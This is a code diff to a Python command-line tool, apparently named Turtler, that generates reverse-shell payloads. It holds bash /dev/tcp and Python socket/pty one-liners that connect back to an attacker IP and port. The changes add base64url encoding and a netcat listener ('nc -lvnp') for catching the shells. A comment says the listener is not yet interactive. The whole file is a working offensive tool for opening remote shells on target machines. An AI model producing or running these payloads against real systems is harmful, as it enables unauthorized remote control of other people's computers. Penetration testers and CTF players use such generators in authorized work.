@@ -6,9 +6,9 @@ import socket
 import fcntl
 import struct
 import base64
-
+import subprocess
 import random
-
+import urllib.parse
 
 
 TEMPLATES = {
@@ -17,7 +17,7 @@ TEMPLATES = {
         "0<&196;exec 196<>/dev/tcp/[ATTACKER_IP]/[ATTACKER_PORT]; bash <&196 >&196 2>&196"
     ],
     "python":[
-        "export RHOST=\"[ATTACKER_IP]\";export RPORT=[ATTACKER_PORT];python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"[SHELL]\")'"
+        "export RHOST=\"[ATTACKER_IP]\";export RPORT=[ATTACKER_PORT];python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"[SHELL]\")'",
         "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"[ATTACKER_IP]\",[ATTACKER_PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"[SHELL]\")'"
     ],
     "php":[
@@ -52,9 +52,9 @@ def argument_parser():
     parser.add_argument('-p', '--port', type=int, help='The port to host the reverse shell on. If omitted will select a random one.', required=False)
     parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output.', required=False)
     parser.add_argument('-t', '--type', type=str, choices=TEMPLATES.keys(), help='The type of reverse shell to create.', required=False, default='bash')
-    parser.add_argument('-e', '--encode', type=str, choices=['base64', 'hex'], help='The encoding to use for the reverse shell.', required=False, default=None)
+    parser.add_argument('-e', '--encode', type=str, choices=['base64','base64url', 'hex'], help='The encoding to use for the reverse shell.', required=False, default=None)
     parser.add_argument('-s', '--shell', type=str, choices=['bash', 'sh'], help='The shell to use (defaults to bash).', required=False, default='bash')
-
+    parser.add_argument('--interactive', action='store_true', help='Start listening on netcat in the script (default: False).', required=False, default=False)
     return parser
 
 
@@ -64,16 +64,19 @@ class Turtler:
                 self,
                  ip_address_or_interface=None,
                  port=None,
-                 shell_type=None,
+                 reverse_shell_type=None,
+                 shell = None,
                  encoding=None,
-                 verbose=False
+                 verbose=False,
+                 interactive=False
                  ):
         self.ip_address_or_interface = ip_address_or_interface
         self.port = port
-        self.shell_type = shell_type
+        self.shell_type = reverse_shell_type
+        self.shell = shell
         self.encoding = encoding
         self.verbose = verbose
-
+        self.interactive = interactive
         if not self.port:
             self.port = self.get_random_port()
 
@@ -98,15 +101,28 @@ class Turtler:
             sys.exit(1)
 
         for template in TEMPLATES[self.shell_type]:
-            payload = template.replace("[ATTACKER_IP]", self.ip_address_or_interface).replace("[ATTACKER_PORT]", str(self.port)).replace("[SHELL]", self.shell_type)
-            if self.encoding == 'base64':
-                payload = f"{Fore.YELLOW} Before Encoding: {payload} {Style.RESET_ALL}\nAfter Encoding: " + base64.b64encode(payload.encode('utf-8')).decode('utf-8')
-            elif self.encoding == 'hex':
-                payload = payload.encode('utf-8').hex()
+            payload = template.replace("[ATTACKER_IP]", self.ip_address_or_interface).replace("[ATTACKER_PORT]", str(self.port)).replace("[SHELL]", self.shell)
+
+            if self.encoding:
+                header = f"{Fore.YELLOW} Before Encoding: {payload} {Style.RESET_ALL}\nAfter Encoding: "
+                if self.encoding == 'base64':
+                    payload = header + base64.b64encode(payload.encode('utf-8')).decode('utf-8')
+                if self.encoding == 'base64url':
+                    payload = header + urllib.parse.quote_plus(base64.b64encode(payload.encode('utf-8')).decode('utf-8'))
+                elif self.encoding == 'hex':
+                    payload = header + payload.encode('utf-8').hex()
 
             print(f"{Fore.GREEN}[+] Generated Payload:{Style.RESET_ALL}")
-            print(payload)
-        
+            print(payload + "\n")
+
+    def catch_netcat(self):
+        input(f"{Fore.GREEN}[+] Press enter to start listening on {self.ip_address_or_interface}:{self.port}...{Style.RESET_ALL}")
+        # This doesn't work, spawns a netcat process but doesn't allow for interaction. Need to figure out how to do that.
+        try:
+            subprocess.run(['nc', '-lvnp', str(self.port)], check=True)
+        except KeyboardInterrupt:
+            quit_shell = print(f"{Fore.YELLOW}\n[!] Stopped listening on {self.ip_address_or_interface}:{self.port}. {Style.RESET_ALL}")
+            print(quit_shell)
     @staticmethod
     def get_ip_address_from_interface(ifname):
         with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
@@ -125,8 +141,10 @@ class Turtler:
 if __name__ == "__main__":
     argument_parser = argument_parser()
     args = argument_parser.parse_args();
-    turtler = Turtler(ip_address_or_interface=args.ip_address, port=args.port, shell_type=args.type, encoding=args.encode, verbose=args.verbose)
-    turtler.construct_payload()
+    turtler = Turtler(ip_address_or_interface=args.ip_address, port=args.port, reverse_shell_type=args.type,shell=args.shell, encoding=args.encode, verbose=args.verbose,interactive=args.interactive);
+    turtler.construct_payload();
+    if turtler.interactive:
+        turtler.catch_netcat();
 
 
 
